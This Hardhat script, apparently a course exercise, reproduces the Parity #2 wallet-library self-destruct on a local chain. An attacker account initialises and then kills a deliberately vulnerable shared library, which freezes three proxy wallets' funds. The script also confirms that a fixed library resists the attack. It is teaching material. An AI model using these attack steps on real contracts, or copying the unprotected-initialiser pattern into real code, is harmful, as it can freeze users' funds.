const { ethers } = require("hardhat");
const { openLog, fmtEth } = require("./lib");

async function main() {
  const log = openLog("parity2_freeze.log");
  log.write("=== Week 12 Part 3: Parity #2 Library Self-Destruct (Freeze) ===");
  log.write("Network: hardhatMainnet (local Hardhat in-memory)");
  log.write("EVM: paris, hardfork: merge (pre-Cancun SELFDESTRUCT semantics)");
  log.write("");

  const [deployer, ownerA, ownerB, ownerC, attacker] = await ethers.getSigners();

  // Step 1: Deploy the shared library
  const Lib = await ethers.getContractFactory("SharedWalletLibraryVulnerable");
  const lib = await Lib.deploy();
  await lib.waitForDeployment();
  const libAddr = await lib.getAddress();
  log.write("Step 1: Deployed SharedWalletLibraryVulnerable: " + libAddr);

  // Step 2: Deploy three SharedWallet proxies pointing at the same library
  const Wallet = await ethers.getContractFactory("SharedWallet");
  const w1 = await Wallet.deploy(libAddr, { value: ethers.parseEther("5") });
  const w2 = await Wallet.deploy(libAddr, { value: ethers.parseEther("5") });
  const w3 = await Wallet.deploy(libAddr, { value: ethers.parseEther("5") });
  await Promise.all([w1.waitForDeployment(), w2.waitForDeployment(), w3.waitForDeployment()]);
  log.write("Step 2: Deployed 3 SharedWallet proxies, each funded with 5 ETH");
  log.write("        Wallet 1: " + (await w1.getAddress()));
  log.write("        Wallet 2: " + (await w2.getAddress()));
  log.write("        Wallet 3: " + (await w3.getAddress()));
  log.write("        All point to shared library: " + libAddr);
  log.write("");

  // Step 3: Initialize each wallet with its legitimate owner via delegatecall
  const iface = new ethers.Interface([
    "function initWallet(address[] _owners, uint256 _required)",
    "function execute(address to, uint256 value)",
    "function killLibrary()",
  ]);
  await ownerA.sendTransaction({
    to: await w1.getAddress(),
    data: iface.encodeFunctionData("initWallet", [[ownerA.address], 1]),
  });
  await ownerB.sendTransaction({
    to: await w2.getAddress(),
    data: iface.encodeFunctionData("initWallet", [[ownerB.address], 1]),
  });
  await ownerC.sendTransaction({
    to: await w3.getAddress(),
    data: iface.encodeFunctionData("initWallet", [[ownerC.address], 1]),
  });
  log.write("Step 3: Each wallet initialized with its own legitimate owner.");
  log.write("        Wallet 1 owner: " + ownerA.address);
  log.write("        Wallet 2 owner: " + ownerB.address);
  log.write("        Wallet 3 owner: " + ownerC.address);
  log.write("");

  // Sanity: legitimate owner can move funds
  log.write("Sanity check: Wallet 1 owner withdraws 1 ETH via execute() before attack");
  await ownerA.sendTransaction({
    to: await w1.getAddress(),
    data: iface.encodeFunctionData("execute", [ownerA.address, ethers.parseEther("1")]),
  });
  log.write("        Wallet 1 balance: " + fmtEth(ethers, await ethers.provider.getBalance(await w1.getAddress())));
  log.write("");

  // Step 4: Attacker calls initWallet() DIRECTLY on the library
  log.write("Step 4: Attacker calls initWallet([attacker], 1) DIRECTLY on the library");
  await lib.connect(attacker).initWallet([attacker.address], 1);
  log.write("        Library's own owners[0] is now: " + (await lib.owners(0)));
  log.write("");

  // Step 5: Attacker calls killLibrary() directly
  log.write("Step 5: Attacker calls killLibrary() directly on the library");
  const codeBefore = await ethers.provider.getCode(libAddr);
  log.write("        Library code size BEFORE kill: " + ((codeBefore.length - 2) / 2) + " bytes");
  await lib.connect(attacker).killLibrary();

  // Force a new block so SELFDESTRUCT (Merge semantics) actually removes code
  await ethers.provider.send("hardhat_mine", ["0x1"]);

  const codeAfter = await ethers.provider.getCode(libAddr);
  log.write("        Library code size AFTER  kill: " + ((codeAfter.length - 2) / 2) + " bytes");
  log.write("");

  // Step 6: Attempt wallet functions - demonstrate delegatecall failure
  log.write("Step 6: Each legitimate owner attempts execute() on their wallet");

  const wallets = [
    { name: "Wallet 1", contract: w1, owner: ownerA },
    { name: "Wallet 2", contract: w2, owner: ownerB },
    { name: "Wallet 3", contract: w3, owner: ownerC },
  ];

  for (const w of wallets) {
    const addr = await w.contract.getAddress();
    const balBefore = await ethers.provider.getBalance(addr);
    let failed = false;
    let reason = "";
    try {
      // Use a low-level call so the tx is broadcast and we can read receipt status
      const tx = await w.owner.sendTransaction({
        to: addr,
        data: iface.encodeFunctionData("execute", [w.owner.address, ethers.parseEther("1")]),
        gasLimit: 200000,
      });
      const rcpt = await tx.wait();
      // On post-kill, delegatecall to empty code returns success with no effect.
      // The wallet balance does NOT decrease.
      const balAfter = await ethers.provider.getBalance(addr);
      if (balAfter === balBefore) {
        failed = true;
        reason = "delegatecall to empty library returned without moving funds";
      } else {
        reason = "unexpected: balance changed";
      }
      log.write("        " + w.name + " execute() tx status=" + rcpt.status + ", " + reason);
    } catch (e) {
      failed = true;
      reason = e.shortMessage || e.message;
      log.write("        " + w.name + " execute() reverted: " + reason);
    }
    log.write("        " + w.name + " balance: " + fmtEth(ethers, await ethers.provider.getBalance(addr)) + " (unchanged, frozen)");
  }
  log.write("");

  // Step 7: Confirm frozen, not stolen
  log.write("Step 7: Confirm funds are FROZEN, not STOLEN");
  log.write("        Attacker EOA balance change is only gas spent.");
  log.write("        Each wallet still holds its ETH but can no longer move it.");
  log.write("        Wallet 1: " + fmtEth(ethers, await ethers.provider.getBalance(await w1.getAddress())));
  log.write("        Wallet 2: " + fmtEth(ethers, await ethers.provider.getBalance(await w2.getAddress())));
  log.write("        Wallet 3: " + fmtEth(ethers, await ethers.provider.getBalance(await w3.getAddress())));
  log.write("");

  // -------- Fixed library verification --------
  log.write("--- Fixed library variant ---");
  const FixedLib = await ethers.getContractFactory("SharedWalletLibraryFixed");
  const fixedLib = await FixedLib.deploy();
  await fixedLib.waitForDeployment();
  const fixedLibAddr = await fixedLib.getAddress();
  log.write("Deployed SharedWalletLibraryFixed: " + fixedLibAddr);

  // Direct init on fixed library should fail
  try {
    await fixedLib.connect(attacker).initWallet([attacker.address], 1);
    log.write("UNEXPECTED: direct initWallet() on fixed library succeeded");
  } catch (e) {
    log.write("Direct initWallet() on fixed library reverted: " + (e.shortMessage || "revert"));
  }

  // killLibrary() doesn't exist on the fixed library
  log.write("Fixed library has NO killLibrary / selfdestruct entrypoint.");

  // Proxy using fixed library still works
  const wFixed = await Wallet.deploy(fixedLibAddr, { value: ethers.parseEther("5") });
  await wFixed.waitForDeployment();
  await ownerA.sendTransaction({
    to: await wFixed.getAddress(),
    data: iface.encodeFunctionData("initWallet", [[ownerA.address], 1]),
  });
  await ownerA.sendTransaction({
    to: await wFixed.getAddress(),
    data: iface.encodeFunctionData("execute", [ownerA.address, ethers.parseEther("2")]),
  });
  log.write("Proxy on fixed library: legitimate owner executed transfer of 2 ETH");
  log.write("Fixed-library proxy balance: " + fmtEth(ethers, await ethers.provider.getBalance(await wFixed.getAddress())));
  log.write("");

  log.write("RESULT: Vulnerable shared library destroyed -> wallet funds frozen in place.");
  log.write("        Fixed library cannot be killed -> proxy wallets remain usable.");
  await log.close();
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
